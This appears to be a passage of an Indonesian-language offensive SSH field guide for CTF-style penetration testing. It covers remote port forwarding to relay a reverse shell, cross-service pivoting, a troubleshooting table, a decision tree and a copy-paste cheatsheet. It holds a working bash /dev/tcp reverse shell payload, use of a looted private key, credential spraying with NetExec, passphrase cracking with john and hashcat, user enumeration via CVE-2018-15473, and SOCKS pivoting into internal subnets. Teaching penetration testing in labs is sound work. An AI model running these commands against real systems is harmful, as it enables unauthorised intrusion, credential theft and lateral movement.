### SKENARIO 3: Remote Port Forwarding (`-R`) — Menyalurkan Reverse Shell dari Jaringan Terisolasi

> **Kasus:** Mesin ketiga di dalam jaringan internal tidak bisa mengakses IP VPN kita (`10.10.14.5`). Kita membuat bridge agar port listener Netcat lokal kita terbuka di dalam target SSH.

Jalankan perintah ini di **TERMINAL MESIN PENYERANG**:

Bash

```
# Membuka port 4444 di target yang dialirkan ke port 4444 penyerang
ssh -R 4444:127.0.0.1:4444 \
    -p $SSH_PORT \
    -i ~/ssh_loot/keys/id_rsa \
    $USER@$TARGET -N -f
```

Listener di Parrot OS:

Bash

```
nc -lvnp 4444
```

Payload yang dieksekusi di mesin ketiga/internal:

Bash

```
bash -i >& /dev/tcp/10.10.11.200/4444 0>&1
```

- ➡️ Shell masuk ke listener lokal kamu.

---

## ═══════════════════════════════════════

## FASE 9: CROSS-SERVICE BRIDGING MAP

## ═══════════════════════════════════════

Setelah kamu berhasil mendapatkan credentials atau foothold via SSH, hubungkan temuan tersebut dengan workflow lain:

text

```
Kredensial / Akses SSH Didapat
     │
     ├──► Ditemukan Database Password di ~/.bash_history / /var/www/
     │      ├─ ─ Port 3306 (MySQL)   ──► <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
     │      ├─ ─ Port 1433 (MSSQL)   ──► <a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14b_mssql_workflow.md</a>
     │      └─ ─ Port 5432 (Postgres)──► <a href="/docs/postgresql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14c_postgresql_workflow.md</a>
     │
     ├──► Ditemukan id_rsa / Hash Baru di /home/
     │      └── Crack passphrase   ──► FASE 5 (ssh2john / john)
     │
     ├──► Port Internal Terbuka (127.0.0.1:80/8080/443)
     │      ├── Port Forwarding (-L)──► FASE 8 (Local Forward)
     │      └─ ─ Akses Web Internal  ──► <a href="/docs/web-recon" class="text-[#00b4d8] hover:underline font-mono font-semibold">15_web_recon_workflow.md</a> & [16. Directory & Virtual Host (VHost) Fuzzing Workflow — Master Field Guide](/docs/directory-vhost-fuzzing)
     │
     ├──► Foothold Linux Non-Root
     │      └─ ─ Privilege Escalation──► <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a> & [🐧 47 — Sudo, SUID & Capabilities Workflow](/docs/sudo-suid-capabilities)
     │
     └──► Target Terhubung ke Subnet Lain
            └── Dynamic Proxy (-D)  ──► <a href="/docs/pivoting-tunneling" class="text-[#00b4d8] hover:underline font-mono font-semibold">64_pivoting_tunneling_workflow.md</a>
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — 12 SKENARIO ERROR & SOLUSI

## ═══════════════════════════════════════

|No|Pesan Error Terminal|Akar Penyebab|Solusi Teknis Konkret|
|---|---|---|---|
|1|`Permission denied (publickey)`|Username salah, atau server menonaktifkan password login|Cek verbosity: `ssh -vvv -i key user@$TARGET`. Validasi list username.|
|2|`Permission denied (publickey,password)`|Password salah atau akun terkunci|Verifikasi kredensial via NetExec; pastikan format domain benar jika AD.|
|3|`Permissions 0644 for 'id_rsa' are too open`|File permission key tidak aman|Jalankan: `chmod 600 id_rsa`.|
|4|`no matching key exchange method found`|Kex algorithm server sudah usang|Tambahkan: `-o KexAlgorithms=+diffie-hellman-group1-sha1`.|
|5|`no matching host key type found`|Algoritma signature host key server usang|Tambahkan: `-o HostKeyAlgorithms=+ssh-rsa,ssh-dss`.|
|6|`no matching cipher found`|Server menggunakan CBC/3DES ciphers lama|Tambahkan: `-c +aes128-cbc,3des-cbc`.|
|7|`Host key verification failed`|Server fingerprint berubah (reset box CTF)|Jalankan: `-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null`.|
|8|`Too many authentication failures`|Client mengirim semua key lokal sebelum password|Tambahkan opsi: `-o PubkeyAuthentication=no`.|
|9|`Connection reset by peer`|IP diblokir oleh fail2ban / TCP Wrapper|Reconnect VPN tun0 untuk merotasi IP, atau turunkan thread brute force.|
|10|`Could not resolve hostname target.htb`|Hostname belum dipetakan ke IP|Tambahkan ke hosts: `echo "$TARGET target.htb" \| sudo tee -a /etc/hosts`.|
|11|`Enter passphrase for key`|Private key diproteksi passphrase|Crack menggunakan `ssh2john id_rsa > hash` lalu `john --wordlist=rockyou.txt hash`.|
|12|`bind [127.0.0.1]:9090: Address already in use`|Port lokal forwarding sudah terpakai|Bunuh proses lama: `fuser -k 9090/tcp` atau ganti ke port lain (misal 9091).|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN TEKNIS)

## ═══════════════════════════════════════

text

```
START: Port 22 / Port Alternatif Terbuka
│
├─ FASE 0 & 1: Reconnaissance & Autentikasi
│   ├─ nc -vn $TARGET 22 ──► Ekstrak OS & OpenSSH Version
│   └─ nmap --script ssh-auth-methods
│       ├─ [publickey only] ──► JANGAN BRUTEFORCE! Cari id_rsa di Web/SMB/FTP/LFI
│       └─ [password enabled] ──► Siapkan wordlist kredensial terarah
│
├─ APAKAH PUNYA PRIVATE KEY (id_rsa)?
│   ├── YES ──► chmod 600 id_rsa
│   │           ├─ [Minta Passphrase] ──► ssh2john ➔ john rockyou.txt ➔ Login
│   │           ├─ [Legacy Cipher Error] ──► Tambahkan flag Kex & HostKey bypass
│   │           └─ [Berhasil Login] ──► MASUK KE FASE 7
│   └── NO ───► Lanjut ke Password Check
│
├─ APAKAH PUNYA KREDENSIAL PASSWORD?
│   ├── YES ──► ssh -o PubkeyAuthentication=no user@$TARGET ──► MASUK KE FASE 7
│   └── NO ───► Evaluasi Bruteforce (Ketat terhadap fail2ban)
│               ├─ OpenSSH < 7.7 ──► Jalankan CVE-2018-15473 (Harvest user valid)
│               └─ Targeted Spray ──► nxc ssh $TARGET -u users.txt -p pass.txt
│
├─ FASE 7: Post-Foothold Enumeration (Di Target)
│   ├── whoami; id; sudo -l ──► Cek vector instant root (GTFOBins)
│   ├── cat ~/.bash_history ──► Cari bocoran password internal
│   └── ss -tlnp ──► Cek port lokal (127.0.0.1)
│
└─ FASE 8: Tunneling & Pivoting
    ├── Port 8080/3306 lokal ──► ssh -L 9090:127.0.0.1:8080 (Local Port Forward)
    └── Subnet internal ──► ssh -D 1080 (Dynamic SOCKS5) + proxychains
```

---

## ⚡ CHEATSHEET — COPY-PASTE READY

Bash

```
# === 1. PERMISSIONS & SILENT KEY LOGIN ===
chmod 600 id_rsa
ssh -i id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@$TARGET

# === 2. ALL-IN-ONE LEGACY CONNECTION (OLD BOXES) ===
ssh -i id_rsa \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o KexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 \
    -o HostKeyAlgorithms=+ssh-rsa,ssh-dss \
    -o PubkeyAcceptedKeyTypes=+ssh-rsa \
    -c +aes128-cbc,3des-cbc \
    user@$TARGET

# === 3. PASSPHRASE EXTRACTION & CRACKING ===
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
# Hashcat Modern OpenSSH:
hashcat -m 22931 id_rsa.hash /usr/share/wordlists/rockyou.txt -w 3

# === 4. CREDENTIAL SPRAYING VIA NETEXEC ===
nxc ssh $TARGET -p 22 -u users.txt -p passwords.txt --continue-on-success

# === 5. TUNNELING: LOCAL FORWARD (-L) ===
ssh -L 9090:127.0.0.1:8080 user@$TARGET -p 22 -i id_rsa -N -f

# === 6. TUNNELING: DYNAMIC SOCKS5 PROXY (-D) ===
ssh -D 1080 user@$TARGET -p 22 -i id_rsa -N -f
# Run: proxychains nmap -sT -Pn -p 80,445 172.16.1.10

# === 7. KILL FORWARDING BACKGROUND PROCESS ===
fuser -k 9090/tcp
fuser -k 1080/tcp
```

---

> **➡️ NEXT:** Jika kamu menemukan kredensial yang sama digunakan untuk service FTP, atau mendeteksi file transfer staging di server, lanjutkan ke **[07. FTP & FTPS Exploitation Workflow — Master Field Guide](/docs/ftp)** untuk mengeksploitasi Anonymous FTP, ProFTPD/vsftpd exploits, serta webroot sync attacks.